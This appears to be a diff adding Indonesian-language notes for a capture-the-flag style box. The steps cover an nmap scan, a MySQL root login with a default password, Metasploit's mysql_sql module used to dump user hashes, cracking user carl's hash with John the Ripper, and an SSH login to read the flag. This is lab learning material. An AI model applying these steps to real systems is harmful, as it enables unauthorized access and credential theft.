@@ -19,4 +19,8 @@
 -> sudo nmap -T4 -p- --min-rate 1000 ip
 -> mysql -h ip -u root -p : password = password
 -> msfconsole -> search mysql_sql -> use -> options -> urutin dari atas ke bawah yg dibutuhin 
--> exploit -> options -> set sql "show databases" 
+-> exploit -> options -> set sql "show databases"
+-> uname: root -> pass: password
+-> ikuti module2 msf nya -> ampe dump hash user 
+-> cari user yg namanya ga default -> carl -> taruh di hash.txt carl + hash nya
+-> john hash.txt -> login ssh pakai uname carl ip dan pass nya -> cat flag 
